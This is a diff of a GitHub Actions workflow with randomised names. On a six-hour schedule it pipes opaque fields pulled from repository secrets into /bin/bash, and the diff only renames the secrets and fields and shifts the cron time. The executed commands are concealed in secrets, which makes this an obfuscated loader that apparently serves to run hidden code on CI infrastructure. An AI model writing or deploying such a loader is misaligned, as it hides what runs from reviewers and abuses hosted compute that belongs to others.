@@ -1,21 +1,20 @@
 name: helianjie6457
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 0/6 * * *'
+    - cron: '11 3/6 * * *'
 
-jobs:  # 19161
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: helianjie6457
         env:
-          ioire6783: ${{ secrets.ioire6783 }}
+          pld0: ${{ secrets.pld0 }}
         run: |
-          echo $ioire6783 | jq -r .tl88 | /bin/bash
-          echo $ci65 | jq -r .o292 | /bin/bash
-          echo $rs2881 | jq -r .nwid4 | /bin/bash
-          echo $kcsdu45326 | jq -r .zy43 | /bin/bash
-          echo $szc744 | jq -r .imgqe897 | /bin/bash
+          echo $pld0 | jq -r .nmunp1965 | /bin/bash
+          echo $fnwxq47 | jq -r .mf9751 | /bin/bash
+          echo $gbusk522 | jq -r .dcs2900 | /bin/bash
 
